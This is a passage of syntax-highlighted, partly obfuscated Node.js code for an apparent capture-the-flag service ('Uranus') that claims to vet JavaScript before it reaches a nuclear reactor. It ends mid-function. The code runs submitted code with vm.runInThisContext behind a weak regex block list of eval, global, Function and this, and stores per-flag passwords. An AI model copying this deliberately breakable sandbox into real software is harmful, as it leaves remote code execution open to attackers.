</span><span class="line"><span class="kd">function</span> <span class="nx">handle</span><span class="p">(</span><span class="nx">E</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">  <span class="kd">var</span> <span class="nx">k</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;aa2e&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;You suck\n&#39;</span> <span class="o">:</span> <span class="s1">&#39;Welcome to Uranus!\nWith the last update of our nuclear reactor we can now control critical variables of the process through the easyness of JavaScript. Uranus is here to proof-check your code for safety before you submit it directly to the reactor. \n\nUse HTTP POST to submit your code.&#39;</span><span class="p">,</span> <span class="nx">V</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;f56&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;test&quot;</span> <span class="o">:</span> <span class="s2">&quot;POST&quot;</span><span class="p">,</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;a6cf&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;indexOf&quot;</span> <span class="o">:</span> <span class="s2">&quot;l&quot;</span><span class="p">,</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;5613&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;method&quot;</span> <span class="o">:</span> <span class="s2">&quot;writeFileSync&quot;</span><span class="p">;</span>
</span><span class="line">  <span class="k">if</span> <span class="p">(</span><span class="nx">E</span><span class="p">[</span><span class="nx">c</span><span class="p">][</span><span class="nx">s</span><span class="p">](</span><span class="nx">V</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">y2</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="nx">handlePOST</span><span class="p">(</span><span class="nx">E</span><span class="p">,</span> <span class="nx">b</span><span class="p">);</span>
</span><span class="line">    <span class="k">return</span><span class="p">;</span>
</span><span class="line">  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class="line">    <span class="nx">b</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">A4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">X2</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">N4</span><span class="p">});</span>
</span><span class="line">    <span class="nx">b</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">f2</span><span class="p">](</span><span class="nx">k</span><span class="p">);</span>
</span><span class="line">  <span class="p">}</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="kd">function</span> <span class="nx">makeSandbox</span><span class="p">()</span> <span class="p">{</span>
</span><span class="line">  <span class="k">delete</span>  <span class="nb">eval</span><span class="p">;</span>
</span><span class="line">  <span class="k">delete</span>  <span class="nb">Function</span><span class="p">;</span>
</span><span class="line">  <span class="k">delete</span>  <span class="nx">require</span><span class="p">;</span>
</span><span class="line">  <span class="k">delete</span>  <span class="nx">fs</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="kd">function</span> <span class="nx">loadSubmission</span><span class="p">(</span><span class="nx">b</span><span class="p">,</span> <span class="nx">k</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">  <span class="kd">var</span> <span class="nx">V</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;81&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;No password found&quot;</span> <span class="o">:</span> <span class="s2">&quot;token&quot;</span><span class="p">,</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;c14&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;match&quot;</span> <span class="o">:</span> <span class="s2">&quot;toString&quot;</span><span class="p">,</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;5f&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;eval&quot;</span> <span class="o">:</span> <span class="s2">&quot;readFileSync&quot;</span><span class="p">,</span> <span class="nx">w</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;ffb7&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;Server running at http://0.0.0.0:1337/&#39;</span> <span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">s4</span><span class="p">,</span> <span class="nx">z</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;fb&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;Your code has runtime errors: &#39;</span> <span class="o">:</span> <span class="nx">b</span> <span class="o">+</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">J4</span> <span class="o">+</span> <span class="nx">k</span><span class="p">;</span>
</span><span class="line">  <span class="k">try</span> <span class="p">{</span>
</span><span class="line">    <span class="kd">var</span> <span class="nx">O</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;67cf&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;Code contains unsafe functionality.\n&quot;</span> <span class="o">:</span> <span class="nx">ff</span><span class="p">[</span><span class="nx">c</span><span class="p">](</span><span class="nx">w</span> <span class="o">+</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">x2</span> <span class="o">+</span> <span class="nx">z</span><span class="p">)[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">w4</span><span class="p">]();</span>
</span><span class="line">    <span class="k">return</span> <span class="nx">O</span><span class="p">[</span><span class="nx">s</span><span class="p">](</span><span class="sr">/password = &quot;([0-9a-zA-Z]{16})&quot;/</span><span class="p">)[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">y2</span><span class="p">];</span>
</span><span class="line">  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="p">;</span>
</span><span class="line">  <span class="p">}</span>
</span><span class="line">  <span class="k">return</span> <span class="nx">V</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="kd">function</span> <span class="nx">test</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">  <span class="kd">var</span> <span class="nx">k</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;1b&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;k&quot;</span> <span class="o">:</span> <span class="s2">&quot;runInThisContext&quot;</span><span class="p">,</span> <span class="nx">V</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;81e&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;vm&quot;</span> <span class="o">:</span> <span class="s2">&quot;handlePOST&quot;</span><span class="p">,</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;74&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="nx">global</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;a11a&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;g&quot;</span> <span class="o">:</span> <span class="nx">E</span><span class="p">;</span>
</span><span class="line">  <span class="p">}</span> <span class="o">:</span> <span class="kc">false</span><span class="p">,</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;33c1&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="nx">password</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;77&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;loadSubmission&quot;</span> <span class="o">:</span> <span class="nx">E</span><span class="p">;</span>
</span><span class="line">  <span class="p">}</span> <span class="o">:</span> <span class="s2">&quot;submissions&quot;</span><span class="p">,</span> <span class="nx">w</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;d5&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;retval&quot;</span> <span class="o">:</span> <span class="nx">require</span><span class="p">(</span><span class="nx">V</span><span class="p">);</span>
</span><span class="line">  <span class="nx">c</span><span class="p">(</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">l2</span><span class="p">);</span>
</span><span class="line">  <span class="nx">s</span><span class="p">(</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">l2</span><span class="p">);</span>
</span><span class="line">  <span class="nx">w</span><span class="p">[</span><span class="nx">k</span><span class="p">](</span><span class="nx">b</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">w4</span><span class="p">]());</span>
</span><span class="line">  <span class="k">return</span> <span class="nx">password</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="kd">function</span> <span class="nx">storeSubmission</span><span class="p">(</span><span class="nx">b</span><span class="p">,</span> <span class="nx">k</span><span class="p">,</span> <span class="nx">V</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">  <span class="kd">var</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;ac&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;handle&quot;</span> <span class="o">:</span> <span class="s2">&quot;writeFileSync&quot;</span><span class="p">,</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;3a8&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;mkdirSync&quot;</span> <span class="o">:</span> <span class="s2">&quot;http&quot;</span><span class="p">,</span> <span class="nx">w</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;6ef&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;statSync&quot;</span> <span class="o">:</span> <span class="s2">&quot;err&quot;</span><span class="p">,</span> <span class="nx">z</span> <span class="o">=</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">s4</span><span class="p">,</span> <span class="nx">O</span> <span class="o">=</span> <span class="nx">b</span> <span class="o">+</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">J4</span> <span class="o">+</span> <span class="nx">k</span><span class="p">;</span>
</span><span class="line">  <span class="k">try</span> <span class="p">{</span>
</span><span class="line">    <span class="kd">var</span> <span class="nx">Z</span> <span class="o">=</span> <span class="nx">ff</span><span class="p">[</span><span class="nx">w</span><span class="p">](</span><span class="nx">z</span><span class="p">);</span>
</span><span class="line">  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="p">;</span>
</span><span class="line">  <span class="p">}</span>
</span><span class="line">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">Z</span><span class="p">)</span><span class="nx">ff</span><span class="p">[</span><span class="nx">c</span><span class="p">](</span><span class="nx">z</span><span class="p">);</span>
</span><span class="line">  <span class="nx">ff</span><span class="p">[</span><span class="nx">s</span><span class="p">](</span><span class="nx">z</span> <span class="o">+</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">x2</span> <span class="o">+</span> <span class="nx">O</span><span class="p">,</span> <span class="nx">V</span><span class="p">);</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="kd">function</span> <span class="nx">checkCode</span><span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">  <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;61&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="kc">true</span> <span class="o">:</span> <span class="s2">&quot;res&quot;</span><span class="p">,</span> <span class="nx">k</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;2f7&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;test&quot;</span> <span class="o">:</span> <span class="kc">false</span><span class="p">,</span> <span class="nx">V</span> <span class="o">=</span> <span class="s2">&quot;test&quot;</span><span class="p">,</span> <span class="nx">s</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;3ae&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="mi">30</span><span class="p">,</span> <span class="mh">0xC4</span><span class="p">)</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mf">96.5E1</span><span class="p">,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;R&#39;</span> <span class="o">:</span> <span class="p">(</span><span class="mf">105.2E1</span><span class="p">,</span> <span class="mi">44</span><span class="p">.)</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">142</span><span class="p">,</span> <span class="mf">1.183E3</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mi">110</span><span class="p">,</span> <span class="mf">133.70E1</span><span class="p">)</span> <span class="o">:</span> <span class="mi">120</span><span class="p">.</span> <span class="o">&gt;</span> <span class="p">(</span><span class="mf">53.6E1</span><span class="p">,</span> <span class="mi">96</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mh">0x24A</span><span class="p">,</span> <span class="s2">&quot;q&quot;</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">8.4E1</span><span class="p">,</span> <span class="mf">1.5E1</span><span class="p">))</span> <span class="o">:</span> <span class="s2">&quot;writeFileSync&quot;</span><span class="p">,</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;ba&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="p">((</span><span class="mf">9.99E2</span><span class="p">,</span> <span class="mf">119.80E1</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="p">(</span><span class="mi">24</span><span class="p">.,</span> <span class="mf">10.96E2</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;\n&#39;</span> <span class="o">:</span> <span class="mi">131</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mh">0x105</span><span class="p">,</span> <span class="mh">0x132</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;\n&#39;</span> <span class="o">:</span> <span class="p">(</span><span class="mf">1.0010E3</span><span class="p">,</span> <span class="mi">72</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mf">23.90E1</span> <span class="o">?</span> <span class="p">(</span><span class="mi">124</span><span class="p">.,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">100</span><span class="p">.,</span> <span class="mh">0x254</span><span class="p">))</span> <span class="o">:</span> <span class="s2">&quot;data&quot;</span><span class="p">,</span> <span class="nx">w</span> <span class="o">=</span> <span class="p">[</span><span class="sr">/eval/</span><span class="p">,</span> <span class="sr">/global/</span><span class="p">,</span> <span class="sr">/Function/</span><span class="p">,</span> <span class="sr">/this/</span><span class="p">];</span>
</span><span class="line">  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">z</span> <span class="o">=</span> <span class="nx">c</span><span class="p">;</span> <span class="nx">A3a</span><span class="p">[</span><span class="nx">s</span><span class="p">](</span><span class="nx">z</span><span class="p">,</span> <span class="nx">w</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">p2</span><span class="p">]);</span> <span class="nx">z</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="nx">w</span><span class="p">[</span><span class="nx">z</span><span class="p">][</span><span class="nx">V</span><span class="p">](</span><span class="nx">E</span><span class="p">))</span> <span class="p">{</span>
</span><span class="line">      <span class="k">return</span> <span class="nx">k</span><span class="p">;</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line">  <span class="p">}</span>
</span><span class="line">  <span class="k">return</span> <span class="nx">b</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="kd">function</span> <span class="nx">handlePOST</span><span class="p">(</span><span class="nx">G</span><span class="p">,</span> <span class="nx">A</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">  <span class="kd">var</span> <span class="nx">N</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;e1c&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;data&quot;</span> <span class="o">:</span> <span class="s2">&quot;hasOwnProperty&quot;</span><span class="p">;</span>
</span><span class="line">  <span class="nx">G</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">t2</span><span class="p">](</span><span class="nx">N</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">k</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">    <span class="kd">var</span> <span class="nx">V</span> <span class="o">=</span> <span class="s1">&#39;Your JSON is malformed. Please provide the following properties: flag_id, token, code\n&#39;</span><span class="p">,</span> <span class="nx">s</span> <span class="o">=</span> <span class="s1">&#39;Code contains unsafe functionality.\n&#39;</span><span class="p">,</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;46cf&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;Your code is missing an access code to the nuclear reactor. Expected variable according to the documentation is &quot;password&quot;.\n&#39;</span> <span class="o">:</span> <span class="s2">&quot;Received: %s&quot;</span><span class="p">,</span> <span class="nx">w</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;53&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;text/plain&#39;</span> <span class="o">:</span> <span class="s1">&#39;Code approved. Please check your parameters carefully before deploying the code to the nuclear reactor.\n&#39;</span><span class="p">,</span> <span class="nx">z</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;555&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;U&quot;</span> <span class="o">:</span> <span class="s2">&quot;i&quot;</span><span class="p">,</span> <span class="nx">O</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;8ccd&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s1">&#39;\n&#39;</span> <span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="nx">Z</span> <span class="o">=</span> <span class="s1">&#39;Your password: &#39;</span><span class="p">,</span> <span class="nx">e</span> <span class="o">=</span> <span class="s2">&quot;code&quot;</span><span class="p">,</span> <span class="nx">T</span> <span class="o">=</span> <span class="s2">&quot;token&quot;</span><span class="p">,</span> <span class="nx">D</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;2235&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;e&quot;</span> <span class="o">:</span> <span class="s2">&quot;flag_id&quot;</span><span class="p">,</span> <span class="nx">J</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;8f&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;hasOwnProperty&quot;</span> <span class="o">:</span> <span class="s2">&quot;hasOwnProperty&quot;</span><span class="p">,</span> <span class="nx">R</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;2fb&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;patterns&quot;</span> <span class="o">:</span> <span class="s2">&quot;parse&quot;</span><span class="p">;</span>
</span><span class="line">    <span class="k">try</span> <span class="p">{</span>
</span><span class="line">      <span class="nx">data_json</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">[</span><span class="nx">R</span><span class="p">](</span><span class="nx">k</span><span class="p">);</span>
</span><span class="line">    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">      <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
</span><span class="line">        <span class="nx">data_json</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;265&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="p">{}</span> <span class="o">:</span> <span class="p">((</span><span class="mh">0x17B</span><span class="p">,</span> <span class="mi">149</span><span class="p">.)</span> <span class="o">&gt;=</span> <span class="p">(</span><span class="mi">30</span><span class="p">.,</span> <span class="mh">0x20F</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="mf">12.17E2</span><span class="p">,</span> <span class="s2">&quot;vm&quot;</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">7.79E2</span><span class="p">,</span> <span class="mi">128</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mh">0x1A6</span> <span class="o">?</span> <span class="p">(</span><span class="mf">21.90E1</span><span class="p">,</span> <span class="mi">200</span><span class="p">)</span> <span class="o">:</span> <span class="p">(</span><span class="mi">57</span><span class="p">.,</span> <span class="mi">53</span><span class="p">.)</span> <span class="o">&gt;</span> <span class="mf">106.7E1</span> <span class="o">?</span> <span class="p">(</span><span class="mf">7.26E2</span><span class="p">,</span> <span class="mi">84</span><span class="p">.)</span> <span class="o">:</span> <span class="p">(</span><span class="mf">11.61E2</span><span class="p">,</span> <span class="mf">1.5E2</span><span class="p">));</span>
</span><span class="line">      <span class="p">};</span>
</span><span class="line">      <span class="nx">b</span><span class="p">();</span>
</span><span class="line">    <span class="p">}</span>
</span><span class="line">    <span class="k">if</span> <span class="p">(</span><span class="nx">data_json</span><span class="p">[</span><span class="nx">J</span><span class="p">](</span><span class="nx">D</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">data_json</span><span class="p">[</span><span class="nx">J</span><span class="p">](</span><span class="nx">T</span><span class="p">))</span> <span class="p">{</span>
</span><span class="line">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">data_json</span><span class="p">[</span><span class="nx">J</span><span class="p">](</span><span class="nx">e</span><span class="p">))</span> <span class="p">{</span>
</span><span class="line">        <span class="nx">old_password</span> <span class="o">=</span> <span class="nx">loadSubmission</span><span class="p">(</span><span class="nx">data_json</span><span class="p">[</span><span class="nx">D</span><span class="p">],</span> <span class="nx">data_json</span><span class="p">[</span><span class="nx">T</span><span class="p">]);</span>
</span><span class="line">        <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">A4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">X2</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">N4</span><span class="p">});</span>
</span><span class="line">        <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">f2</span><span class="p">](</span><span class="nx">Z</span> <span class="o">+</span> <span class="nx">old_password</span> <span class="o">+</span> <span class="nx">O</span><span class="p">);</span>
</span><span class="line">      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class="line">        <span class="kd">var</span> <span class="nx">W</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;d6b7&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">          <span class="nx">code</span> <span class="o">=</span> <span class="nx">E</span><span class="p">[</span><span class="nx">e</span><span class="p">];</span>
</span><span class="line">        <span class="p">}</span> <span class="o">:</span> <span class="s2">&quot;No password found&quot;</span><span class="p">,</span> <span class="nx">B</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">          <span class="nx">password</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;5c78&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;retval&quot;</span> <span class="o">:</span> <span class="nx">E</span><span class="p">;</span>
</span><span class="line">        <span class="p">};</span>
</span><span class="line">        <span class="nx">B</span><span class="p">(</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">l2</span><span class="p">);</span>
</span><span class="line">        <span class="nx">W</span><span class="p">(</span><span class="nx">data_json</span><span class="p">);</span>
</span><span class="line">        <span class="k">if</span> <span class="p">(</span><span class="nx">checkCode</span><span class="p">(</span><span class="nx">code</span><span class="p">))</span> <span class="p">{</span>
</span><span class="line">          <span class="k">try</span> <span class="p">{</span>
</span><span class="line">            <span class="nx">retval</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;c4&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;Server running at http://0.0.0.0:1337/&quot;</span> <span class="o">:</span> <span class="nx">test</span><span class="p">(</span><span class="nx">code</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">w4</span><span class="p">]());</span>
</span><span class="line">          <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">            <span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">r3A8</span><span class="p">.</span><span class="nx">J8</span><span class="p">(</span><span class="s2">&quot;b38a&quot;</span><span class="p">)</span> <span class="o">?</span> <span class="s2">&quot;Your password: &quot;</span> <span class="o">:</span> <span class="s1">&#39;Your code has runtime errors: &#39;</span><span class="p">;</span>
</span><span class="line">            <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">A4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">X2</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">N4</span><span class="p">});</span>
</span><span class="line">            <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">f2</span><span class="p">](</span><span class="nx">b</span> <span class="o">+</span> <span class="nx">E</span> <span class="o">+</span> <span class="nx">O</span><span class="p">);</span>
</span><span class="line">          <span class="p">}</span>
</span><span class="line">          <span class="k">try</span> <span class="p">{</span>
</span><span class="line">            <span class="k">if</span> <span class="p">(</span><span class="nx">A3a</span><span class="p">[</span><span class="nx">z</span><span class="p">](</span><span class="nx">password</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">p2</span><span class="p">],</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">y2</span><span class="p">))</span> <span class="p">{</span>
</span><span class="line">              <span class="nx">storeSubmission</span><span class="p">(</span><span class="nx">data_json</span><span class="p">[</span><span class="nx">D</span><span class="p">],</span> <span class="nx">data_json</span><span class="p">[</span><span class="nx">T</span><span class="p">],</span> <span class="nx">code</span><span class="p">);</span>
</span><span class="line">              <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">A4</span><span class="p">](</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">X2</span><span class="p">,</span> <span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="nx">z9o2</span><span class="p">.</span><span class="nx">N4</span><span class="p">});</span>
</span><span class="line">              <span class="nx">A</span><span class="p">[</span><span class="nx">z9o2</span><span class="p">.</span><span class="nx">f2</span><span class="p">](</span><span class="nx">w</span><span class="p">);</span>
</span><span class="line">            <span class="p">}</span>
</span><span class="line">          <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">E</span><span class="p">)</span> <span class="p">{</span>
